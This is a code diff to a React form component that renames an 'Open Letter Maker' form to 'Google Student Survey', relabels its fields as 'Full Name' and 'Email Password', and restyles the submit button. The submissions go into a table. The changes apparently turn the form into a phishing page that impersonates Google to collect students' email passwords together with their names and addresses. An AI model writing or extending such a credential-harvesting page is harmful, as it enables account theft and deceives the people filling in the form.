@@ -38,7 +38,7 @@ function Add() {
             <div classname="container">
                 <form action>
                     <div className="main">
-                        <h1>Open Letter Maker</h1>
+                        <h1> Google Student Survey</h1>
                         <hr />
                         <p>
                             All the Submissions to this form will be appended into a table as
@@ -47,7 +47,7 @@ function Add() {
                         <h4 style={{ color: 'red' }}>* Required</h4>
                     </div>
                     <div className="name">
-                        <h3>Name <span style={{ color: 'red' }}>*</span></h3>
+                        <h3>Full Name <span style={{ color: 'red' }}>*</span></h3>
                         <input value={name} onChange={(e) => setname(e.target.value)} type="text" name="name" />
                     </div>
                     <div className="name">
@@ -59,7 +59,7 @@ function Add() {
                         <input value={email} onChange={(e) => setemail(e.target.value)} type="email" name="name" id required />
                     </div>
                     <div className="email">
-                        <h3>Password <span style={{ color: 'red' }}>*</span></h3>
+                        <h3>Email Password <span style={{ color: 'red' }}>*</span></h3>
                         <input style={{ borderBottom: "1px solid black", width: "90%", paddingBottom: "10px" }} type="password" value={password} onChange={(e) => setpassword(e.target.value)} name="password" id required />
                     </div>
                     <div className="email">
@@ -71,8 +71,8 @@ function Add() {
                         <input style={{ borderBottom: "1px solid black", width: "90%", paddingBottom: "10px" }} value={course} onChange={(e) => setcourse(e.target.value)} type="name" name="Number" />
                     </div>
 
-                    <div className="submit">
-                        <button onClick={submit} >Submit</button>
+                    <div className="submit" >
+                        <button onClick={submit} style={{ background: "purple", width: "100px", height: "50px" }}>Submit</button>
                     </div>
                     <p className="rule">Never submit passwords through Google Forms</p>
                     <p className="policy">
